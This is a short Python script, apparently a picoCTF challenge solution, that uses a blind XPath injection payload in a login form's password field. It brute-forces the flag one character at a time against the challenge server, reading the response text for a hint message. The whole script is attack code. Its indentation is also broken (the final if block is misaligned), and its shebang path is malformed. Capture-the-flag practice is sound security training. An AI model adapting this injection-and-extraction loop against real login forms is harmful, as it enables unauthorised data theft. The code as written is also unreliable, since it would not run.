#!/usr/env/python3 
# Author : 7h3h4ckv157
# https://github.com/7h3h4ckv157
# https://twitter.com/7h3h4ckv157


import requests
from string import *

all = ascii_lowercase + ascii_uppercase + digits+"}_"
print(all)

start = ["picoCTF{"]
while True:

    for x in all:
      
        print(f"***checking: {''.join(start)+x}")
        hehe = ''.join(start)+x
        data = {"name":"admin", "pass":f"' or //*[starts-with(text(),'{hehe}')] or '1'='"}
        r = requests.post("http://mercury.picoctf.net:53735/", data=data)

        hackvist = r.text

          if "You&#39;re on the right path." in hackvist:
                start.append(x)
                break
